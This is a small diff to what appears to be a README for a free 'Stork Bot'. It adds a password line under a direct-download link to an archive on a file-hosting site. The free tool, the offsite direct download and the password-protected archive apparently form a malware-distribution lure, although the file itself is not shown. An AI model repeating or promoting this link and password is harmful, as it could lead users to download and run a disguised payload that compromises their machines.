@@ -4,6 +4,8 @@
 
 ---
 # [DOWNLOAD STORK BOT](https://www.4sync.com/web/directDownload/0SYg-YYX/ucR3VkWM.ef25c34754ba95f31294e53aca576eca)  
+# PASSWORD - g1tsoft2025
+
 ## 💸 Free to Use
 
 **Stork Bot** is completely free to use.  
